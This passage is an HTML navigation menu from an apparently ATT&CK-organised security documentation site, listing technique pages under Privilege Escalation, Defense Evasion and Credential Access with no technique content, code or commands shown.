<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.001.html">T1098.001 - Additional Cloud Credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.002.html">T1098.002 - Additional Email Delegate Permissions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.003.html">T1098.003 - Additional Cloud Roles</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.004.html">T1098.004 - SSH Authorized Keys</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.005.html">T1098.005 - Device Registration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.006.html">T1098.006 - Additional Container Cluster Roles</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1098.html">T1098 - Account Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.001.html">T1134.001 - Token Impersonation/Theft</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.002.html">T1134.002 - Create Process with Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.003.html">T1134.003 - Make and Impersonate Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.004.html">T1134.004 - Parent PID Spoofing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.005.html">T1134.005 - SID-History Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1134.html">T1134 - Access Token Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1484.001.html">T1484.001 - Group Policy Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1484.002.html">T1484.002 - Domain Trust Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1484.html">T1484 - Domain Policy Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1543.001.html">T1543.001 - Launch Agent</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1543.002.html">T1543.002 - Systemd Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1543.003.html">T1543.003 - Windows Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1543.004.html">T1543.004 - Launch Daemon</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1543.html">T1543 - Create or Modify System Process</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.001.html">T1546.001 - Change Default File Association</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.002.html">T1546.002 - Screensaver</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.003.html">T1546.003 - Windows Management Instrumentation Event Subscription</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.004.html">T1546.004 - Unix Shell Configuration Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.005.html">T1546.005 - Trap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.006.html">T1546.006 - LC_LOAD_DYLIB Addition</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.007.html">T1546.007 - Netsh Helper DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.008.html">T1546.008 - Accessibility Features</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.009.html">T1546.009 - AppCert DLLs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.010.html">T1546.010 - AppInit DLLs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.011.html">T1546.011 - Application Shimming</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.012.html">T1546.012 - Image File Execution Options Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.013.html">T1546.013 - PowerShell Profile</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.014.html">T1546.014 - Emond</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.015.html">T1546.015 - Component Object Model Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.016.html">T1546.016 - Installer Packages</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1546.html">T1546 - Event Triggered Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.001.html">T1547.001 - Registry Run Keys / Startup Folder</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.002.html">T1547.002 - Authentication Package</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.003.html">T1547.003 - Time Providers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.004.html">T1547.004 - Winlogon Helper DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.005.html">T1547.005 - Security Support Provider</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.006.html">T1547.006 - Kernel Modules and Extensions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.007.html">T1547.007 - Re-opened Applications</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.008.html">T1547.008 - LSASS Driver</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.009.html">T1547.009 - Shortcut Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.010.html">T1547.010 - Port Monitors</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.012.html">T1547.012 - Print Processors</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.013.html">T1547.013 - XDG Autostart Entries</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.014.html">T1547.014 - Active Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.015.html">T1547.015 - Login Items</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1547.html">T1547 - Boot or Logon Autostart Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.001.html">T1548.001 - Setuid and Setgid</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.002.html">T1548.002 - Bypass User Account Control</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.003.html">T1548.003 - Sudo and Sudo Caching</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.004.html">T1548.004 - Elevated Execution with Prompt</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.005.html">T1548.005 - Temporary Elevated Cloud Access</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1548.html">T1548 - Abuse Elevation Control Mechanism</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.001.html">T1574.001 - DLL Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.002.html">T1574.002 - DLL Side-Loading</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.004.html">T1574.004 - Dylib Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.005.html">T1574.005 - Executable Installer File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.006.html">T1574.006 - Dynamic Linker Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.007.html">T1574.007 - Path Interception by PATH Environment Variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.008.html">T1574.008 - Path Interception by Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.009.html">T1574.009 - Path Interception by Unquoted Path</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.010.html">T1574.010 - Services File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.011.html">T1574.011 - Services Registry Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.012.html">T1574.012 - COR_PROFILER</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.013.html">T1574.013 - KernelCallbackTable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1574.html">T1574 - Hijack Execution Flow</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1611.html">T1611 - Escape to Host</a></li>
</ul>
</li>
<li class="toctree-l1 current active has-children"><a class="reference internal" href="../defense-evasion.html">Defense Evasion</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-5"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="T1006.html">T1006 - Direct Volume Access</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1014.html">T1014 - Rootkit</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.001.html">T1027.001 - Binary Padding</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.002.html">T1027.002 - Software Packing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.003.html">T1027.003 - Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.004.html">T1027.004 - Compile After Delivery</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.005.html">T1027.005 - Indicator Removal from Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.006.html">T1027.006 - HTML Smuggling</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.007.html">T1027.007 - Dynamic API Resolution</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.008.html">T1027.008 - Stripped Payloads</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.009.html">T1027.009 - Embedded Payloads</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.010.html">T1027.010 - Command Obfuscation</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.011.html">T1027.011 - Fileless Storage</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.012.html">T1027.012 - LNK Icon Smuggling</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1027.html">T1027 - Obfuscated Files or Information</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.001.html">T1036.001 - Invalid Code Signature</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.002.html">T1036.002 - Right-to-Left Override</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.003.html">T1036.003 - Rename System Utilities</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.004.html">T1036.004 - Masquerade Task or Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.005.html">T1036.005 - Match Legitimate Name or Location</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.006.html">T1036.006 - Space after Filename</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.007.html">T1036.007 - Double File Extension</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.008.html">T1036.008 - Masquerade File Type</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.009.html">T1036.009 - Break Process Trees</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1036.html">T1036 - Masquerading</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.001.html">T1055.001 - Dynamic-link Library Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.002.html">T1055.002 - Portable Executable Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.003.html">T1055.003 - Thread Execution Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.004.html">T1055.004 - Asynchronous Procedure Call</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.005.html">T1055.005 - Thread Local Storage</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.008.html">T1055.008 - Ptrace System Calls</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.009.html">T1055.009 - Proc Memory</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.011.html">T1055.011 - Extra Window Memory Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.012.html">T1055.012 - Process Hollowing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.013.html">T1055.013 - Process Doppelgänging</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.014.html">T1055.014 - VDSO Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.015.html">T1055.015 - ListPlanting</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1055.html">T1055 - Process Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.001.html">T1070.001 - Clear Windows Event Logs</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.002.html">T1070.002 - Clear Linux or Mac System Logs</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.003.html">T1070.003 - Clear Command History</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.004.html">T1070.004 - File Deletion</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.005.html">T1070.005 - Network Share Connection Removal</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.006.html">T1070.006 - Timestomp</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.007.html">T1070.007 - Clear Network Connection History and Configurations</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.008.html">T1070.008 - Clear Mailbox Data</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.009.html">T1070.009 - Clear Persistence</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1070.html">T1070 - Indicator Removal</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1078.001.html">T1078.001 - Default Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1078.002.html">T1078.002 - Domain Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1078.003.html">T1078.003 - Local Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1078.004.html">T1078.004 - Cloud Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1078.html">T1078 - Valid Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1112.html">T1112 - Modify Registry</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1127.001.html">T1127.001 - MSBuild</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1127.html">T1127 - Trusted Developer Utilities Proxy Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.001.html">T1134.001 - Token Impersonation/Theft</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.002.html">T1134.002 - Create Process with Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.003.html">T1134.003 - Make and Impersonate Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.004.html">T1134.004 - Parent PID Spoofing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.005.html">T1134.005 - SID-History Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1134.html">T1134 - Access Token Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1140.html">T1140 - Deobfuscate/Decode Files or Information</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1197.html">T1197 - BITS Jobs</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1202.html">T1202 - Indirect Command Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1205.001.html">T1205.001 - Port Knocking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1205.002.html">T1205.002 - Socket Filters</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1205.html">T1205 - Traffic Signaling</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1207.html">T1207 - Rogue Domain Controller</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1211.html">T1211 - Exploitation for Defense Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1216.001.html">T1216.001 - PubPrn</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1216.html">T1216 - System Script Proxy Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.001.html">T1218.001 - Compiled HTML File</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.002.html">T1218.002 - Control Panel</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.003.html">T1218.003 - CMSTP</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.004.html">T1218.004 - InstallUtil</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.005.html">T1218.005 - Mshta</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.007.html">T1218.007 - Msiexec</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.008.html">T1218.008 - Odbcconf</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.009.html">T1218.009 - Regsvcs/Regasm</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.010.html">T1218.010 - Regsvr32</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.011.html">T1218.011 - Rundll32</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.012.html">T1218.012 - Verclsid</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.013.html">T1218.013 - Mavinject</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.014.html">T1218.014 - MMC</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1218.html">T1218 - System Binary Proxy Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1220.html">T1220 - XSL Script Processing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1221.html">T1221 - Template Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1222.001.html">T1222.001 - Windows File and Directory Permissions Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1222.002.html">T1222.002 - Linux and Mac File and Directory Permissions Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1222.html">T1222 - File and Directory Permissions Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1480.001.html">T1480.001 - Environmental Keying</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1480.html">T1480 - Execution Guardrails</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1484.001.html">T1484.001 - Group Policy Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1484.002.html">T1484.002 - Domain Trust Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1484.html">T1484 - Domain Policy Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1497.001.html">T1497.001 - System Checks</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1497.002.html">T1497.002 - User Activity Based Checks</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1497.003.html">T1497.003 - Time Based Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1497.html">T1497 - Virtualization/Sandbox Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1535.html">T1535 - Unused/Unsupported Cloud Regions</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.001.html">T1542.001 - System Firmware</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.002.html">T1542.002 - Component Firmware</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.003.html">T1542.003 - Bootkit</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.004.html">T1542.004 - ROMMONkit</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.005.html">T1542.005 - TFTP Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1542.html">T1542 - Pre-OS Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.001.html">T1548.001 - Setuid and Setgid</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.002.html">T1548.002 - Bypass User Account Control</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.003.html">T1548.003 - Sudo and Sudo Caching</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.004.html">T1548.004 - Elevated Execution with Prompt</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.005.html">T1548.005 - Temporary Elevated Cloud Access</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1548.html">T1548 - Abuse Elevation Control Mechanism</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1550.001.html">T1550.001 - Application Access Token</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1550.002.html">T1550.002 - Pass the Hash</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1550.003.html">T1550.003 - Pass the Ticket</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1550.004.html">T1550.004 - Web Session Cookie</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1550.html">T1550 - Use Alternate Authentication Material</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.001.html">T1553.001 - Gatekeeper Bypass</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.002.html">T1553.002 - Code Signing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.003.html">T1553.003 - SIP and Trust Provider Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.004.html">T1553.004 - Install Root Certificate</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.005.html">T1553.005 - Mark-of-the-Web Bypass</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.006.html">T1553.006 - Code Signing Policy Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1553.html">T1553 - Subvert Trust Controls</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.001.html">T1556.001 - Domain Controller Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.002.html">T1556.002 - Password Filter DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.003.html">T1556.003 - Pluggable Authentication Modules</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.004.html">T1556.004 - Network Device Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.005.html">T1556.005 - Reversible Encryption</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.006.html">T1556.006 - Multi-Factor Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.007.html">T1556.007 - Hybrid Identity</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.008.html">T1556.008 - Network Provider DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1556.html">T1556 - Modify Authentication Process</a></li>
<li class="toctree-l2 current active"><a class="current reference internal" href="#">T1562.001 - Disable or Modify Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.002.html">T1562.002 - Disable Windows Event Logging</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.003.html">T1562.003 - Impair Command History Logging</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.004.html">T1562.004 - Disable or Modify System Firewall</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.006.html">T1562.006 - Indicator Blocking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.007.html">T1562.007 - Disable or Modify Cloud Firewall</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.008.html">T1562.008 - Disable or Modify Cloud Logs</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.009.html">T1562.009 - Safe Mode Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.010.html">T1562.010 - Downgrade Attack</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.011.html">T1562.011 - Spoof Security Alerting</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.012.html">T1562.012 - Disable or Modify Linux Audit System</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1562.html">T1562 - Impair Defenses</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.001.html">T1564.001 - Hidden Files and Directories</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.002.html">T1564.002 - Hidden Users</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.003.html">T1564.003 - Hidden Window</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.004.html">T1564.004 - NTFS File Attributes</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.005.html">T1564.005 - Hidden File System</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.006.html">T1564.006 - Run Virtual Instance</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.007.html">T1564.007 - VBA Stomping</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.008.html">T1564.008 - Email Hiding Rules</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.009.html">T1564.009 - Resource Forking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.010.html">T1564.010 - Process Argument Spoofing</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.011.html">T1564.011 - Ignore Process Interrupts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1564.html">T1564 - Hide Artifacts</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.001.html">T1574.001 - DLL Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.002.html">T1574.002 - DLL Side-Loading</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.004.html">T1574.004 - Dylib Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.005.html">T1574.005 - Executable Installer File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.006.html">T1574.006 - Dynamic Linker Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.007.html">T1574.007 - Path Interception by PATH Environment Variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.008.html">T1574.008 - Path Interception by Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.009.html">T1574.009 - Path Interception by Unquoted Path</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.010.html">T1574.010 - Services File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.011.html">T1574.011 - Services Registry Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.012.html">T1574.012 - COR_PROFILER</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.013.html">T1574.013 - KernelCallbackTable</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1574.html">T1574 - Hijack Execution Flow</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.001.html">T1578.001 - Create Snapshot</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.002.html">T1578.002 - Create Cloud Instance</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.003.html">T1578.003 - Delete Cloud Instance</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.004.html">T1578.004 - Revert Cloud Instance</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.005.html">T1578.005 - Modify Cloud Compute Configurations</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1578.html">T1578 - Modify Cloud Compute Infrastructure</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1599.001.html">T1599.001 - Network Address Translation Traversal</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1599.html">T1599 - Network Boundary Bridging</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1600.001.html">T1600.001 - Reduce Key Space</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1600.002.html">T1600.002 - Disable Crypto Hardware</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1600.html">T1600 - Weaken Encryption</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1601.001.html">T1601.001 - Patch System Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1601.002.html">T1601.002 - Downgrade System Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1601.html">T1601 - Modify System Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1610.html">T1610 - Deploy Container</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1612.html">T1612 - Build Image on Host</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1620.html">T1620 - Reflective Code Loading</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1622.html">T1622 - Debugger Evasion</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1647.html">T1647 - Plist File Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="T1656.html">T1656 - Impersonation</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../credential-access.html">Credential Access</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-6"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.001.html">T1003.001 - LSASS Memory</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.002.html">T1003.002 - Security Account Manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.003.html">T1003.003 - NTDS</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.004.html">T1003.004 - LSA Secrets</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.005.html">T1003.005 - Cached Domain Credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.006.html">T1003.006 - DCSync</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.007.html">T1003.007 - Proc Filesystem</a></li>
<li class="toctree-l2"><a class="reference internal" href="../credential-access/T1003.008.html">T1003.008 - /etc/passwd and /etc/shadow</a></li>
